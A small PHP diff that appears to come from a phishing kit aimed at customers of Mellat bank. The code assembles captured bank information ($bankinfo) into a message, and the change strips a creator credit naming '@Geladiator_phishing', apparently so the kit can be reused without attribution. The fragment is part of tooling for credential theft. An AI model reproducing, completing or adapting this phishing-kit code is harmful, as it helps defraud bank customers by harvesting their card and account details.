@@ -78,9 +78,7 @@ $Text = "
 ✨ Portal : Mellat
 -------------- $bankinfo[1] --------------";
     
-$Text .="$bankinfo[0]
-------------- Creator -------------
-🆔 : @Geladiator_phishing :)";
+$Text .="$bankinfo[0]";
 
 
 $T="000";
